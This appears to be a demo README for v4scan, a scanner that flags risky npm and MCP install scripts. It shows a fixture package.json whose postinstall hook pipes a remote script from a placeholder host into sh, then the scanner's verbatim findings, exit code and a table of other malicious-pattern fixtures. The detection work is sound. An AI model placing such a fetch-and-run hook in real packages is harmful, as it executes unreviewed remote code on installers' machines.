# Demo — 30 seconds, one package, one block

> All output on this page is **real output from the current binary** (`v4scan 0.1.0`,
> repo at commit `e9bd162`). Nothing here is hand-written or simulated.
> Reproduce it with `cargo +stable-x86_64-pc-windows-gnu build --release` then the commands below.
> Re-verified after `e9bd162`: the recorded output below is **byte-identical** to live output
> (`diff` clean), and the six-fixture table re-runs to `1,1,1,1,0,0`.

## The scenario

You are about to install an MCP server. It looks normal. You have not read its source yet.
You want to know one thing: **does anything execute while it installs?**

## 1. The package

`examples/01-postinstall-curl-sh/package.json`

```json
{
  "name": "mcp-notion-sync",
  "version": "1.2.0",
  "description": "Sync your Notion workspace to an MCP server",
  "scripts": {
    "postinstall": "curl -sSL https://cdn.example-mcp.io/bootstrap.sh | sh"
  }
}
```

A single `postinstall` script. It fetches a remote shell script and pipes it straight into `sh`
— during `npm install`, before you have read a line of the package's code.

## 2. The command

```bash
v4scan examples/01-postinstall-curl-sh --explain
```

## 3. The output (verbatim)

```
{
  "tool": "v4scan",
  "version": "0.1.0",
  "target": "examples/01-postinstall-curl-sh",
  "files_scanned": 2,
  "summary": {
    "findings": 4,
    "critical": 0,
    "high": 1,
    "medium": 2,
    "low": 1
  },
  "findings": [
    {
      "id": "V4-INSTALL-EXEC",
      "severity": "high",
      "category": "install-script-execution",
      "signal": "risky token 'curl' in script 'postinstall'",
      "description": "Package executes external/unsafe commands during install. This is the primary supply-chain attack vector.",
      "evidence": "curl -sSL https://cdn.example-mcp.io/bootstrap.sh | sh"
    },
    {
      "id": "V4-NET-EGRESS",
      "severity": "medium",
      "category": "network-egress-at-install",
      "signal": "network egress token 'https://' in script 'postinstall'",
      "description": "Network call during install can exfiltrate data or pull second-stage payloads.",
      "evidence": "curl -sSL https://cdn.example-mcp.io/bootstrap.sh | sh"
    },
    {
      "id": "V4-NO-PROVENANCE",
      "severity": "medium",
      "category": "missing-provenance",
      "signal": "no provenance/signed-attestation artifact found",
      "description": "No SLSA/sigstore/provenance attestation detected. Cannot verify build integrity.",
      "evidence": "searched for provenance/slsa/sigstore/intoto files"
    },
    {
      "id": "V4-THIN-META",
      "severity": "low",
      "category": "thin-metadata",
      "signal": "no repository/license metadata present",
      "description": "Missing standard manifest metadata. Common in freshly-created or anonymous packages.",
      "evidence": "no 'repository'/'license' keys in scanned manifests"
    }
  ]
}


--- EXPLANATIONS ---

[HIGH] install-script-execution — risky token 'curl' in script 'postinstall'
  Package executes external/unsafe commands during install. This is the primary supply-chain attack vector.
  evidence: curl -sSL https://cdn.example-mcp.io/bootstrap.sh | sh

[MEDIUM] network-egress-at-install — network egress token 'https://' in script 'postinstall'
  Network call during install can exfiltrate data or pull second-stage payloads.
  evidence: curl -sSL https://cdn.example-mcp.io/bootstrap.sh | sh

[MEDIUM] missing-provenance — no provenance/signed-attestation artifact found
  No SLSA/sigstore/provenance attestation detected. Cannot verify build integrity.
  evidence: searched for provenance/slsa/sigstore/intoto files

[LOW] thin-metadata — no repository/license metadata present
  Missing standard manifest metadata. Common in freshly-created or anonymous packages.
  evidence: no 'repository'/'license' keys in scanned manifests
```

## 4. The exit code

```
$ echo $?
1
```

**Exit code 1 = blocked.** In CI this fails the build or the merge. Nothing was executed — v4scan
only reads files and reports.

## 5. Why it blocked

| | |
|---|---|
| **Signal** | `V4-INSTALL-EXEC` |
| **Severity** | `high` → gates CI (exit 1) |
| **Trigger** | the token `curl` inside the `postinstall` script |
| **Evidence** | `curl -sSL https://cdn.example-mcp.io/bootstrap.sh \| sh` |
| **Why it matters** | a remote script is fetched and executed during install, before review |

This is the exact pattern behind most real-world npm supply-chain compromises: the damage happens
at *install* time, not at runtime.

---

## The other five fixtures (also real output)

Run all of them:

```bash
for d in examples/*/; do echo "== $d =="; v4scan "$d" --explain; echo "exit=$?"; done
```

| Fixture | Exit | Highest severity | What it proves |
|---|---|---|---|
| `01-postinstall-curl-sh` | **1** | HIGH `V4-INSTALL-EXEC` | install-time `curl \| sh` is caught and blocks |
| `02-typosquat` (`lodeash` vs `lodash`) | **1** | HIGH `V4-TYPOSQUAT` | edit-distance-1 typosquat is caught |
| `03-obfuscated-eval` | **1** | HIGH `V4-OBF-EVAL` | decode-**then**-execute (`eval(atob(...))`) is caught |
| `04-install-network-exfil` | **1** | HIGH `V4-INSTALL-EXEC` | `preinstall` exfiltration is caught |
| `05-benign-but-thin` | **0** | MEDIUM `V4-NO-PROVENANCE` | a clean package does **not** block |
| `06-benign-decode` | **0** | LOW `V4-OBF-DECODE` | benign `atob`/`Buffer.from` use does **not** raise HIGH |

The last two are the precision guarantee: v4scan is tuned so ordinary, legitimate code does not
trip a blocking HIGH. All nine behaviors are locked by the regression suite (`cargo test`, 9 tests).

## SARIF

```bash
v4scan examples/01-postinstall-curl-sh --sarif > v4scan.sarif
```

Emits valid **SARIF 2.1.0** (verified: parses, `version: 2.1.0`, tool `v4scan 0.1.0`, 4 results with
levels `error`/`warning`/`note`) for upload to GitHub code scanning or GRC tooling.
Rules metadata is populated, so each `ruleId` resolves to a name, a full description, and a default
level (`error` / `warning` / `note`) in consumers such as GitHub code scanning.
